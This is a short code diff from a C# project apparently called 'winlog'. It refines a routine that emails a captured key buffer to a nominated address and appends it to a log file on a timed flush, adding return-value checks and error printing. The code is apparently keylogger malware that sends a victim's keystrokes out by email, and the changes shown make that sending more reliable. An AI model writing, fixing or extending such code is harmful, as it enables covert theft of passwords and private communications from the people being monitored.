@@ -362,8 +362,12 @@ namespace winlog
                 // sending log to the nominated email address
                                 
                 Print2Console();
+                string retval = string.Empty;
                 Mailer m = new Mailer();
-                m.SendLog(keyBuffer);
+                retval = m.SendLog(keyBuffer);
+
+                if (retval != "SUCCESS")
+                    Print(retval);
                
 
                 FileStream fil = new FileStream(file, FileMode.Append, FileAccess.Write);
@@ -376,17 +380,15 @@ namespace winlog
             }
             catch (Exception ex)
             {
-                // Uncomment this to help debug.
-                //System.Console.WriteLine(ex.Message);
+                Print(ex.Message);
                 throw;
             }
         }
 
         public void Print2Console()
         {
-            Form1._Form1.Print(string.Format("Sending log data (buffer size {0})", keyBuffer.Length));
-            Form1._Form1.Print(string.Format("Next flush in {0} seconds)", FlushInterval / 1000));
-            Form1._Form1.Print("_____________________________");
+            Print(string.Format("Sending log (buffer size {0})", keyBuffer.Length));
+            Print(string.Format("Next flush in {0} seconds", FlushInterval / 1000));            
         }
 
         #region Properties
